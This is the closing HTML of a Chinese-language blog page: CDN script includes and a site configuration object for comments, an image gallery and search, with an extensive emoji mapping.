                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"OGG2bwJUUrIOs4sAfU87yE6d-gzGzoHsz","appKey":"vOzsADf7YdkMoNXlgShAFepl","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
